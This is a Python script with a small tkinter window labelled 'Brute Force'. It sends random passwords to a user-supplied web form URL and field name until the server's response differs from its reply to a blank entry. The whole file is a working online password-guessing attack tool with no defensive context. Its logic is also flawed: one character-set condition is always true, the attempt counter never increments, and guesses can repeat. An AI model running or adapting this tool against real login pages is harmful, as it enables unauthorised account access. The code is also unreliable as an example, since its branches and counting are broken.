# -*- coding: utf-8 -*-
# pip install
# requests
# random-password-generator
# char is for what letters to add for example:
# L = lower cased letter
# U = upper cased letter
# D = digits aka numbers
import requests
from password_generator import PasswordGenerator
import tkinter as tk
from tkinter import messagebox

f = open("html.txt", "w")
f.write("")
f.close()

win = tk.Tk()

win.title("Brute Force")
win.geometry("480x300")
win.configure(bg="gray")

text1 = tk.Entry(win)
text1.insert(tk.END, "Char")
text1.place(x=50, y=70)

text2 = tk.Entry(win)
text2.insert(tk.END, "URL")
text2.place(x=50, y=110)

text3 = tk.Entry(win)
text3.insert(tk.END, "Length")
text3.place(x=300, y=70)

text4 = tk.Entry(win)
text4.insert(tk.END, "Key")
text4.place(x=300, y=110)

def click_Onbutton():
  global char
  global url
  global length
  global key
  char = text1.get()
  url = text2.get()
  length = int(text3.get())
  key = text4.get()
  bruteforce()

button = tk.Button(win, text="GO", font=("", 20), command=click_Onbutton)
button.place(x=210, y=150)

def gen(i):
  pwo = PasswordGenerator()
  if char == "U":
    return pwo.shuffle_password('ABCDEFGHIJKLMNOPQRSTUVWXYZ', i)
  elif char == "L":
    return pwo.shuffle_password('abcdefghijklmnopqrstuvwxyz', i)
  elif char == "D":
    return pwo.shuffle_password('1234567890', i)
  elif char == "LD" or "DL":
    return pwo.shuffle_password('abcdefghijklmnopqrstuvwxyz1234567890', i)
  elif char == "UD" or "DU":
    return pwo.shuffle_password('ABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890', i)
  elif char == "UL" or "LU":
    return pwo.shuffle_password('ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz', i)
  else:
    return pwo.shuffle_password(i)

def bruteforce():
  count = 0
  while True:
    pas = gen(length)
    print(pas)
    message = {key: pas}
    req = requests.post(url, data=message)
    message2 = {key: " "}
    get = requests.post(url, data=message2)
    count +1
    if get.text != req.text:
      print("---------------")
      print(req)
      print("Password: ", pas, "Count: ", count)
      messagebox.showinfo("Success", "Found password: " + pas)

      break

win.mainloop()
